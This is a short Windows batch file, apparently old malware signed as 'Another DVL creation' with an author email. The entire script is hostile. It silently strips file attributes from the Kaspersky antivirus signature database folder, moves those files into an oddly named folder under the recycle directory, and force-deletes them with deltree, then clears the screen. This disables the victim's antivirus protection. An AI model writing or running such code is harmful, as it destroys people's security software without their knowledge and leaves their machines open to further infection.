@echo off
::Another DVL creation
@attrib C:\PROGRA~1\COMMON~1\AVPSHA~1\AVPBASES\*.* -s -h -r +a
@md c:\recycled\��� >nul
@move C:\PROGRA~1\COMMON~1\AVPSHA~1\AVPBASES\*.* c:\recycled\��� >nul
@deltree/y c:\recycled\��� >nul
::dvl2003ro@yahoo.co.uk
cls